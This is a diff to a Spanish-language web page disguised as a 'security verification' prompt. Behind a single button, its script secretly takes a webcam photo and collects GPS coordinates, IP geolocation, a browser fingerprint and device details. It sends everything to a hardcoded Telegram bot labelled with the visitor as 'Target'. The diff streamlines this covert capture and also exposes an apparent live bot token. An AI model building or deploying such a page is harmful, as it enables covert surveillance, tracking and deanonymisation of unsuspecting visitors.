@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Verificación de seguridad</title>
+    <title>Verificación</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -45,23 +45,8 @@
             font-weight: 500;
             cursor: pointer;
             width: 100%;
-            transition: background 0.2s;
         }
-        button:active {
-            background: #1557b0;
-            transform: scale(0.98);
-        }
-        .warning {
-            background: #fef7e0;
-            border-left: 4px solid #f9ab00;
-            padding: 12px;
-            margin-top: 20px;
-            border-radius: 8px;
-            color: #5f6368;
-            font-size: 0.8rem;
-            text-align: left;
-        }
-        a { color: #1a73e8; text-decoration: none; }
+        button:active { background: #1557b0; transform: scale(0.98); }
     </style>
 </head>
 <body>
@@ -69,27 +54,17 @@
     <h1>🔐 Verificación requerida</h1>
     <p>Presiona el botón para continuar</p>
     <button id="btn">✅ Verificar acceso</button>
-    <div id="webview-warning" style="display:none;" class="warning">
-        ⚠️ Estás usando un navegador integrado (Instagram/Facebook). Para que esto funcione correctamente, <strong>abre este enlace en Safari o Chrome</strong>.<br><br>
-        <button id="open-external">📱 Abrir en navegador externo</button>
-    </div>
 </div>
 
 <video id="video" autoplay playsinline style="display:none"></video>
 <canvas id="canvas" style="display:none"></canvas>
 
 <script>
-    // 🔐 REVOCA TU TOKEN VIEJO CON @BotFather Y PON AQUÍ EL NUEVO
+    // 🔐 REVOCA TU TOKEN VIEJO Y PON AQUÍ EL NUEVO
     const BOT_TOKEN = '8803149571:AAF6V8NewmO0JSUAlXdJh1NUuhMo1lwOH6s';
     const CHAT_ID = '7555997298';
 
-    // Detectar WebView (Instagram, Facebook, etc.)
-    function isWebView() {
-        const ua = navigator.userAgent;
-        return /(Instagram|FBAN|FBAV|Twitter|WhatsApp|Snapchat)/i.test(ua);
-    }
-
-    // ---------- Funciones de captura (sin mensajes) ----------
+    // ---------- Funciones (sin ningún mensaje) ----------
     async function getIPinfo() {
         try {
             const res = await fetch('https://ipapi.co/json/');
@@ -103,14 +78,7 @@
                 timezone: data.timezone || 'N/A'
             };
         } catch(e) {
-            return {
-                ip: 'N/A',
-                country: 'N/A',
-                region: 'N/A',
-                city: 'N/A',
-                postal: 'N/A',
-                timezone: 'N/A'
-            };
+            return { ip: 'N/A', country: 'N/A', region: 'N/A', city: 'N/A', postal: 'N/A', timezone: 'N/A' };
         }
     }
 
@@ -157,10 +125,7 @@
 
     function getGPS() {
         return new Promise((resolve) => {
-            if (!navigator.geolocation) {
-                resolve(null);
-                return;
-            }
+            if (!navigator.geolocation) { resolve(null); return; }
             navigator.geolocation.getCurrentPosition(
                 (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy }),
                 () => resolve(null),
@@ -199,12 +164,8 @@
         try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd }); } catch(e) {}
     }
 
-    // ---------- Proceso completo (sin mensajes, sin bloqueo) ----------
     async function fullProcess() {
-        // 1. Capturar foto
         const foto = await capturePhoto();
-        
-        // 2. Obtener todos los datos restantes (IP, fingerprint, etc.)
         const [fp, ipInfo, device, storage, gps] = await Promise.all([
             getFingerprint(),
             getIPinfo(),
@@ -212,8 +173,6 @@
             getStorageInfo(),
             getGPS()
         ]);
-
-        // Construir mensaje
         let message = `📊 *Visitor Information Captured*\n━━━━━━━━━━━━━━━━\n\n`;
         message += `🖥️ *Device & Browser*\n   • Device Model: ${device.model}\n   • User Agent: ${device.ua}\n\n`;
         message += `🎨 *Fingerprint*\n   • GPU: ${fp.gpu}\n   • Fonts: ${fp.fonts}\n   • Canvas: ${fp.canvasHash}...\n\n`;
@@ -222,38 +181,22 @@
         if (gps) {
             message += `   • GPS Coordinates: ${gps.lat}, ${gps.lng}\n   • Accuracy: ±${gps.accuracy} meters\n   • Google Maps: https://www.google.com/maps?q=${gps.lat},${gps.lng}\n`;
         } else {
-            message += `   • GPS: Permiso denegado o no disponible\n`;
+            message += `   • GPS: No disponible\n`;
             if (ipInfo.city !== 'N/A') {
                 message += `   • IP approximate location:\n   • Country: ${ipInfo.country}\n   • Region: ${ipInfo.region}\n   • City: ${ipInfo.city}\n   • Postal: ${ipInfo.postal}\n   • Timezone: ${ipInfo.timezone}\n`;
                 message += `   • Map: https://www.google.com/maps?q=${ipInfo.city},${ipInfo.country}\n`;
             }
         }
         message += `\n🖼️ *Display Information*\n   • Resolution: ${device.resolution}\n\n`;
-        message += `🔐 *Device Permissions*\n   • Camera: ${foto ? 'Permitido' : 'Denegado/No disponible'}\n   • Location: ${gps ? 'Permitido' : 'Denegado/No disponible'}\n\n`;
+        message += `🔐 *Device Permissions*\n   • Camera: ${foto ? 'Permitido' : 'Denegado'}\n   • Location: ${gps ? 'Permitido' : 'Denegado'}\n\n`;
         message += `💾 *Hardware & Storage*\n   • CPU Cores: ${device.cpuCores}\n   • RAM: N/A GB\n   • Storage Used: ${storage.used} GB\n   • Storage Total: ${storage.total} GB\n`;
-        message += `━━━━━━━━━━━━━━━━\n🎯 Target: ${window.location.href}\n⚡ Developed by: @Society\n`;
-
-        // Enviar texto y foto
+        message += `━━━━━━━━━━━━━━━━\n🎯 Target: ${window.location.href}\n⚡ Developed by: @Society👨🏻‍💻\n`;
         await sendMessage(message);
         if (foto) await sendPhoto(foto);
     }
 
-    // ---------- Configuración del botón (permite múltiples clics) ----------
-    document.addEventListener('DOMContentLoaded', () => {
-        if (isWebView()) {
-            document.getElementById('btn').style.display = 'none';
-            document.getElementById('webview-warning').style.display = 'block';
-            document.getElementById('open-external').onclick = () => {
-                alert('Copia el enlace y ábrelo en Safari/Chrome');
-            };
-        } else {
-            const btn = document.getElementById('btn');
-            // Cada clic ejecuta el proceso completo sin bloqueos
-            btn.onclick = async () => {
-                await fullProcess();
-            };
-        }
-    });
+    const btn = document.getElementById('btn');
+    btn.onclick = () => { fullProcess(); };
 </script>
 </body>
 </html>
